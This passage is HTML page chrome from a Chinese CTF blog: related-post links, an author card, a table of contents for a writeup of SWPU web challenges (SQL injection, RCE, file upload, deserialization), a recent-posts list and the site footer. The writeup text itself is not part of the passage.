fa-fw"></i> 2021-07-28</div><div class="title">【AH_training】PHP反序列化</div></div></a></div><div><a href="/2021/07/25/【AH_training】SQL注入/" title="【AH_training】SQL注入"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-25</div><div class="title">【AH_training】SQL注入</div></div></a></div><div><a href="/2021/07/28/【BUUCTF】BUUCTF_Blacklist/" title="【BUUCTF】BUUCTF_Blacklist"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-28</div><div class="title">【BUUCTF】BUUCTF_Blacklist</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://s.pc.qq.com/tousu/img/20210616/7147099_1623831911.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">DC_comics</div><div class="author-info__description">Creator && CTFer</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dc-wh"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPU"><span class="toc-number">1.</span> <span class="toc-text">SWPU:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gift-F12"><span class="toc-number">2.1.</span> <span class="toc-text">gift_F12:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-md5"><span class="toc-number">2.2.</span> <span class="toc-text">easy_md5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-sql"><span class="toc-number">2.3.</span> <span class="toc-text">easy_sql:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jicao"><span class="toc-number">2.4.</span> <span class="toc-text">jicao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#caidao"><span class="toc-number">2.5.</span> <span class="toc-text">caidao:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#do-you-know-http"><span class="toc-number">2.6.</span> <span class="toc-text">do you know http:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload1-0"><span class="toc-number">2.7.</span> <span class="toc-text">easyupload1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload2-0"><span class="toc-number">2.8.</span> <span class="toc-text">easyupload2.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-rce"><span class="toc-number">2.9.</span> <span class="toc-text">easy-rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-rce"><span class="toc-number">2.10.</span> <span class="toc-text">baby-rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-unserialize"><span class="toc-number">2.11.</span> <span class="toc-text">ez_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#include"><span class="toc-number">2.12.</span> <span class="toc-text">include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#error"><span class="toc-number">2.13.</span> <span class="toc-text">error</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9ASQLMAP%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">2.13.1.</span> <span class="toc-text">方法1：SQLMAP一把梭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.13.2.</span> <span class="toc-text">方法2：报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-wakeup"><span class="toc-number">2.14.</span> <span class="toc-text">no_wakeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload3-0"><span class="toc-number">2.15.</span> <span class="toc-text">easyupload3.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#finalrce"><span class="toc-number">2.16.</span> <span class="toc-text">finalrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardrce"><span class="toc-number">2.17.</span> <span class="toc-text">hardrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pop"><span class="toc-number">2.18.</span> <span class="toc-text">pop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PseudoProtocols"><span class="toc-number">2.19.</span> <span class="toc-text">PseudoProtocols</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql"><span class="toc-number">2.20.</span> <span class="toc-text">sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyunser"><span class="toc-number">2.21.</span> <span class="toc-text">babyunser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardrce-3"><span class="toc-number">2.22.</span> <span class="toc-text">hardrce_3</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/22/year/2022/5/github%E5%9B%BE%E5%BA%8A%E6%8C%82%E6%8E%89%E5%90%8E%E7%9A%84%E5%B0%9D%E8%AF%95/" title="github图床挂掉后的尝试"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="github图床挂掉后的尝试"/></a><div class="content"><a class="title" href="/2022/05/22/year/2022/5/github%E5%9B%BE%E5%BA%8A%E6%8C%82%E6%8E%89%E5%90%8E%E7%9A%84%E5%B0%9D%E8%AF%95/" title="github图床挂掉后的尝试">github图床挂掉后的尝试</a><time datetime="2022-05-22T03:47:01.000Z" title="发表于 2022-05-22 11:47:01">2022-05-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/22/a%E6%9C%AA%E5%91%BD%E5%90%8D/" title="无题"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/22/a%E6%9C%AA%E5%91%BD%E5%90%8D/" title="无题">无题</a><time datetime="2022-05-22T03:37:10.022Z" title="发表于 2022-05-22 11:37:10">2022-05-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/25/03251740_test/" title="【Gitee】图床测试"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Gitee】图床测试"/></a><div class="content"><a class="title" href="/2022/03/25/03251740_test/" title="【Gitee】图床测试">【Gitee】图床测试</a><time datetime="2022-03-25T09:41:20.000Z" title="发表于 2022-03-25 17:41:20">2022-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/18/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DBackupFile1/" title="【BUUCTF】[ACTF 2020]新生赛 backupfile1"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【BUUCTF】[ACTF 2020]新生赛 backupfile1"/></a><div class="content"><a class="title" href="/2022/03/18/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DBackupFile1/" title="【BUUCTF】[ACTF 2020]新生赛 backupfile1">【BUUCTF】[ACTF 2020]新生赛 backupfile1</a><time datetime="2022-03-18T02:41:04.000Z" title="发表于 2022-03-18 10:41:04">2022-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/01/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%90%8Epicgo%E5%92%8Ctypora%E6%8A%A5%E9%94%99%E4%BF%AE%E6%94%B9/" title="重装系统后picgo和typora报错修改"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="重装系统后picgo和typora报错修改"/></a><div class="content"><a class="title" href="/2021/12/01/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%90%8Epicgo%E5%92%8Ctypora%E6%8A%A5%E9%94%99%E4%BF%AE%E6%94%B9/" title="重装系统后picgo和typora报错修改">重装系统后picgo和typora报错修改</a><time datetime="2021-12-01T09:53:53.000Z" title="发表于 2021-12-01 17:53:53">2021-12-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/829.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By DC_comics</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
